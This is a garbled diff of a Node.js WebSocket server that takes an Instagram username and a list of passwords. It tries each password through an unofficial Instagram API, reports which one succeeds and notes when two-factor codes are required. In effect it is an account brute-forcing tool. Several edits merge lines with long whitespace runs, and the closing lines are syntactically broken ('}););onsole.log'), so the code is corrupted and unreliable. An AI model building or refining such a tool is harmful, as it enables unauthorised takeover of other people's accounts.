@@ -1,5 +1,4 @@
-n http://localhost:${PORT}`);
-});const WebSocket = require('ws');
+const WebSocket = require('ws');
 const express = require('express');
 const { IgApiClient } = require('instagram-private-api');
 require('dotenv').config();
@@ -23,8 +22,7 @@ async function testPassword(username, password) {
     // Detectar si se requiere un código de 6 dígitos
     if (error.message.includes('two_factor_required')) {
       return { success: false, password, message: 'Se requiere un código de 6 dígitos para la verificación.' };
-    }
-    return { success: false, password, message: error.message };
+    }                                                                 return { success: false, password, message: error.message };
   }
 }
 
@@ -36,8 +34,7 @@ wss.on('connection', (ws) => {
     const data = JSON.parse(message);
 
     if (data.type === 'startLogin') {
-      const { username, passwords } = data;
-      let correctPassword = null;
+      const { username, passwords } = data;                             let correctPassword = null;
 
       // Probar cada contraseña línea por línea
       for (const password of passwords) {
@@ -68,15 +65,10 @@ wss.on('connection', (ws) => {
         }));
       }
     }
-  });
-
-  ws.on('close', () => {
-    console.log('Client disconnected');
-  });
-});
+}););onsole.log('Client disconnected');
 
 // Iniciar el servidor
 const PORT = process.env.PORT || 8080;
 server.listen(PORT, () => {
-  console.log(`Server running on http://localhost:${PORT}`);
+  console.log(`Server running on http://localhost:${PORT}`); // <-- Error corregido
 });
